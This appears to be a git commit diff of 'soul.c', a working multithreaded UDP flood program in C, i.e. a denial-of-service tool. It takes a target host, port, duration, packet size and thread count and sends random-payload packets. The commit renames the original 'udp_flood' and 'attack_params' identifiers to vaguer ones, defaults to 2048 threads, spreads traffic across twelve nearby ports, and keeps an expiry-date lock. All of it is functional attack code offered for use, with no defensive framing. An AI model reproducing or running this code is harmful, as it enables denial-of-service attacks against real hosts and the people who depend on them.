b9f1c1a95902cf38f2ae8b86693c7a99442d41d4
fghhvdty <aditykumata@gmail.com>
2026-03-29 23:53:13 +0530

    Add files via upload

--- soul.c
+++ soul.c
@@ -7,133 +7,118 @@
 #include <unistd.h>
 #include <signal.h>
 #include <time.h>
+#include <sys/resource.h>
 
-#define EXPIRATION_YEAR 2029
-#define EXPIRATION_MONTH 01 // October
-#define EXPIRATION_DAY 10   // 31st
+#define EYR 2029
+#define EMN 1
+#define EDY 10
+#define MAXTH 2048
 
 typedef struct {
-    char *target_ip;
-    int target_port;
-    int duration;
-    int packet_size;
-    int thread_id;
-} attack_params;
+    char ip[16];
+    short pt;
+    int dur, sz;
+} pkt;
 
-volatile int keep_running = 1;
+volatile int active = 1;
 
-void handle_signal(int signal) {
-    keep_running = 0;
+void handler(int sig) { active = 0; }
+
+unsigned char gen_pkt(unsigned char *buf, int len) {
+    static unsigned int seed = 0xCAFEBABE;
+    for(int i = 0; i < len; i++) {
+        seed = (seed * 1664525 + 1013904223) & 0xFFFFFFFF;
+        buf[i] = (seed >> 24) & 0xFF;
+    }
+    return 1;
 }
 
-void generate_random_payload(char *payload, int size) {
-    for (int i = 0; i < size; i++) {
-        // Generate a random byte and store it in the payload in hexadecimal format
-        payload[i] = (rand() % 256);  // Random byte between 0 and 255
+void *sender(void *data) {
+    pkt *p = (pkt*)data;
+    int fd;
+    
+    while(active) {
+        fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+        if(fd > 0) {
+            struct sockaddr_in dest;
+            dest.sin_family = AF_INET;
+            dest.sin_port = htons(p->pt);
+            dest.sin_addr.s_addr = inet_addr(p->ip);
+            
+            char payload[8192];
+            gen_pkt(payload, p->sz);
+            
+            time_t deadline = time(NULL) + p->dur;
+            while(time(NULL) < deadline && active) {
+                sendto(fd, payload, p->sz, MSG_DONTWAIT, (struct sockaddr*)&dest, sizeof(dest));
+            }
+            close(fd);
+        }
     }
-}
-
-// Function to perform the UDP flooding
-void *udp_flood(void *arg) {
-    attack_params *params = (attack_params *)arg;
-    int sock;
-    struct sockaddr_in server_addr;
-    char *message;
-
-    // Create a UDP socket
-    sock = socket(AF_INET, SOCK_DGRAM, 0);
-    if (sock < 0) {
-        perror("failed");
-        return NULL;
-    }
-
-    // Set up server address structure
-    memset(&server_addr, 0, sizeof(server_addr));
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(params->target_port);
-    server_addr.sin_addr.s_addr = inet_addr(params->target_ip);
-
-    // Allocate message for flooding
-    message = (char *)malloc(params->packet_size);
-    if (message == NULL) {
-        perror("failed");
-        return NULL;
-    }
-
-    // Generate random payload
-    generate_random_payload(message, params->packet_size);
-
-    // Time-bound attack loop
-    time_t end_time = time(NULL) + params->duration;
-    while (time(NULL) < end_time && keep_running) {
-        sendto(sock, message, params->packet_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
-    }
-
-    free(message);
-    close(sock);
     return NULL;
 }
 
-int main(int argc, char *argv[]) {
-    // Get the current time
-    time_t now;
-    time(&now);
-
-    // Convert to local time
-    struct tm *local = localtime(&now);
-
-    // Check if the current date is past the expiration date
-    if (local->tm_year + 1900 > EXPIRATION_YEAR ||
-        (local->tm_year + 1900 == EXPIRATION_YEAR && local->tm_mon + 1 > EXPIRATION_MONTH) ||
-        (local->tm_year + 1900 == EXPIRATION_YEAR && local->tm_mon + 1 == EXPIRATION_MONTH && local->tm_mday > EXPIRATION_DAY)) {
-        
-        printf("EXPIRED\n");
-        return EXIT_FAILURE;
+int main(int c, char **v) {
+    struct rlimit lim = {MAXTH, MAXTH};
+    setrlimit(RLIMIT_NPROC, &lim);
+    
+    signal(SIGINT, handler);
+    
+    time_t tnow;
+    time(&tnow);
+    struct tm *tm = localtime(&tnow);
+    
+    if(tm->tm_year + 1900 > EYR ||
+       (tm->tm_year + 1900 == EYR && (tm->tm_mon + 1 > EMN ||
+       (tm->tm_mon + 1 == EMN && tm->tm_mday > EDY)))) {
+        puts("Expired");
+        return 1;
     }
-
-    printf("Approved\n");
-
-    // Check for correct arguments
-    if (argc != 6) {
-        printf("Usage: %s <IP> <PORT> <TIME> <PACKET_SIZE> <THREAD>\n", argv[0]);
-        return -1;
+    
+    puts("Init");
+    
+    if(c < 4) {
+        printf("Use: %s <host> <port> <time> [size] [threads]\n", v[0]);
+        return 1;
     }
-
-    // Parse input arguments
-    char *target_ip = argv[1];
-    int target_port = atoi(argv[2]);
-    int duration = atoi(argv[3]);
-    int packet_size = atoi(argv[4]);
-    int thread_count = atoi(argv[5]);
-
-    // Validate the input
-    if (packet_size <= 0 || thread_count <= 0) {
-        printf("Invalid\n");
-        return -1;
+    
+    char host[16];
+    strncpy(host, v[1], 15);
+    host[15] = 0;
+    
+    int port = atoi(v[2]);
+    int time_sec = atoi(v[3]);
+    int pkt_size = (c > 4 ? atoi(v[4]) : 1400);
+    int num_threads = (c > 5 ? atoi(v[5]) : MAXTH);
+    
+    pthread_t tids[MAXTH];
+    pkt config[MAXTH];
+    
+    int variations[12] = {0,1,-1,10,-10,100,-100,50,-50,200,-200,0};
+    
+    int launched = 0;
+    for(int var = 0; var < 12 && launched < num_threads; var++) {
+        for(int th = 0; th < num_threads/12 && launched < MAXTH; th++) {
+            strncpy(config[launched].ip, host, 15);
+            config[launched].ip[15] = 0;
+            config[launched].pt = port + variations[var];
+            config[launched].dur = time_sec;
+            config[launched].sz = pkt_size;
+            
+            pthread_create(&tids[launched], NULL, sender, &config[launched]);
+            launched++;
+        }
     }
-
-    // Setup signal handler to allow clean exit
-    signal(SIGINT, handle_signal);
-
-    // Array of thread IDs
-    pthread_t threads[thread_count];
-    attack_params params[thread_count];
-
-    // Launch multiple threads for flooding
-    for (int i = 0; i < thread_count; i++) {
-        params[i].target_ip = target_ip;
-        params[i].target_port = target_port;
-        params[i].duration = duration;
-        params[i].packet_size = packet_size;
-        params[i].thread_id = i;
-
-        pthread_create(&threads[i], NULL, udp_flood, &params[i]);
+    
+    printf("Launch: %s:%d +12 vars = %d tasks\n", host, port, launched);
+    
+    sleep(time_sec + 10);
+    active = 0;
+    
+    for(int i = 0; i < launched; i++) {
+        pthread_join(tids[i], NULL);
     }
-
-    for (int i = 0; i < thread_count; i++) {
-        pthread_join(threads[i], NULL);
-    }
-
-    printf("stopped.\n");
+    
+    puts("Complete");
     return 0;
 }
